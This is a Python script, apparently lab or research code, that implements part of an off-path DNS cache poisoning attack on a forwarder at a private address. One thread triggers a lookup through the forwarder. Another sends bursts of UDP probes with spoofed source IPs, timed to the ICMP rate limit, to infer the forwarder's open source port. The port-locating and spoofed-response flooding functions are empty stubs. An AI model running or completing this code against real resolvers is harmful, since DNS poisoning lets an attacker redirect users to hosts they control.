import dns.resolver
import socket
from scapy.all import *
import random
import time
import threading
from ipaddress import IPv6Network, IPv6Address


lock = threading.Lock()


def get_my_ip():
    ret = socket.gethostbyname(socket.gethostname())
    print (ret)
    return ret

def get_random_domain():
    '''
    Return a random domain name from top 10K sites listed on the file
    '''

    random.seed(time.time())
    filepath = 'opendns-top-domains.txt'
    domain_names = []
    with open(filepath) as fp:
        for cnt, line in enumerate(fp):
            domain_names.append(line)
    return random.choice(domain_names)

def random_ipv6_address():
    """
    Generate a random IPv6 address for a specified subnet
    """
    
    subnet = '2001:db8:100::/64'

    random.seed(time.time())
    network = IPv6Network(subnet)
    address = IPv6Address(network.network_address + getrandbits(network.max_prefixlen - network.prefixlen))

    print(address)
    return address

forwarder_ip = '192.168.58.2'
forwarder_port = 53
domain_name = "cool.com"
local_free_ip = []

def initialize():
    # Initialize local_free_ip list
    local_ip_base = '192.168.58.'
    start = 5
    end = 254
    now = start
    while now <= end:
        local_free_ip.append(local_ip_base + str(now))
        now += 1
    #print (local_free_ip)
    print (len(local_free_ip))

def step1(thread_id):
    try:
        
        print("thread id: " + str(thread_id))
        print(domain_name)

        # making our dns forwarder to be used for upstream dns server
        my_resolver = dns.resolver.Resolver()
        my_resolver.nameservers = [forwarder_ip]

        lock.acquire();
        print("lock acquired from thread : " + str(thread_id))

        result = my_resolver.resolve(domain_name, 'A')
        print("found actual response from thread : " + str(thread_id))
    
        # this is a dns.resolver.Answer object without the __dict__ command
        print(result.__dict__)
        print(result.response)

        #for printing the ip address of the query
        '''
        for ipval in result:
            print ('IP', ipval.to_text())
        '''

    except dns.exception.Timeout:
        print ("Timeout on DNS query.")
    except dns.resolver.NXDOMAIN:
        print ("The query name does not exist.")
    except dns.resolver.NoNameservers:
        print ("No nameservers were able to answer the query")

    lock.release()
    print("released lock from thread : " + str(thread_id))

    return

# We are going to use this for infering the actual source port also,
# that's why adding another parameter 'number_of_padding_packet'
def do_one_chunk_of_attack(port_start, number_of_probe_packet, number_of_padding_packet):

    print("do_one_attack_chunk " + str(port_start) + "," + str(number_of_probe_packet) +
            "," + str(number_of_padding_packet))

    #ip_layer = IP(dst=forwarder_ip, src=random.choice(local_free_ip)) # not specifying the src, so that scapy can fill this up
    #ip_layer = IP(dst=forwarder_ip, src=RandIP())
    #udp_layer = UDP(dport=forwarder_port, sport=RandShort())
    #packet = ip_layer / udp_layer / dns_layer

    # generate all probe packets, padding_packets (if any) and the verification packet first
    # and then send those in a burst
    probe_packet = []

    for i in range(number_of_probe_packet):
        # Using spoofed ip
        ip_layer = IP(dst=forwarder_ip, src=RandIP())
        udp_layer = UDP(dport=forwarder_port, sport=RandShort())
        packet = ip_layer / udp_layer
        probe_packet.append(packet)

    padding_packet = []

    for i in range(number_of_padding_packet):
        # Using spoofed ip
        ip_layer = IP(dst=forwarder_ip, src=RandIP())
        udp_layer = UDP(dport=1, sport=RandShort())
        packet = ip_layer / udp_layer
        padding_packet.append(packet)

    ip_layer = IP(dst=forwarder_ip) # leaving src to be filled up by scapy
    udp_layer = UDP(dport=1, sport=RandShort())
    verification_packet = ip_layer / udp_layer

    
    for packet in probe_packet:
        send(packet, verbose=False)
    for packet in padding_packet:
        send(packet, verbose=False)
    print("Sending verification packet")
    reply = sr1(verification_packet, timeout=1) # in seconds
    print("Got reply from verificaiton packet")
    print (reply.show())

    return False # for now

def find_the_exact_port(start_port, number_of_ports):
    None

def flood_the_port_with_spoofed_dns_response(actual_port):
    None

def step2(thread_id, source_port_range_start, source_port_range_end):
    #need to run this file with sudo because of port 53
    '''
    # initially trying to send a upd probe packet to the dns server to get any reply first
    # using the actual ip of this machine, but not getting it at this moment
    ip_layer = IP(dst=forwarder_ip) # not specifying the src, so that scapy can fill this up
    udp_layer = UDP(dport=forwarder_port, sport=attacker_port)
    dns_layer = DNS(rd=1,qd=DNSQR(qname=get_random_domain()))
    packet = ip_layer / udp_layer / dns_layer
    #send(packet)
    ret = sr(packet)
    print(ret)
    '''

    print("thread id : " + str(thread_id))

    # Wait for the thread 1 to send the dns query first (aka, acruire the lock)
    while lock.locked() == False:
        None
    
    ICMP_limit_rate = 50
    ICMP_recovering_time = '20ms'

    start = source_port_range_start

    while lock.locked() and start + ICMP_limit_rate <= source_port_range_end:
        print("lock status: " + str(lock.locked()))
        start_time_one_chunk = time.perf_counter() #for system wide time count
        
        print("Calling do_one_attack_chunk")
        ret = do_one_chunk_of_attack(start, ICMP_limit_rate, 0)
        print("Got reply from do_one_attack_chunk : " + str(ret))

        if ret: # got an ICMP reply
            port = find_the_exact_port(start, ICMP_limit_rate)
            result = flood_the_port_with_spoofed_dns_response(port)
            if result == True:
                return True

        '''
        end_time_one_chunk = time.perf_counter()
        time_elapsed_for_one_chunk = end_time_one_chunk - start_time_one_chunk
        if (time_elapsed_for_one_chunk < ICMP_recovering_time)
            time.sleep(ICMP_recovering_time - time_elapsed_for_one_chunk)
        '''
        print("Sleeping for 50ms")
        time.sleep(0.05)

        start += ICMP_limit_rate

    # Either actual dns response has been reached or tried all source ports
    return False

def main():
    #step1();
    #step2();
    initialize()
    
    t1 = threading.Thread(target=step1, args=(1, ))
    t1.start()
    t2 = threading.Thread(target=step2, args=(2, 33000, 33500))
    #t2 = threading.Thread(target=step2, args=(2, 32768, 60999))
    t2.start()
    

if __name__ == "__main__":
    main()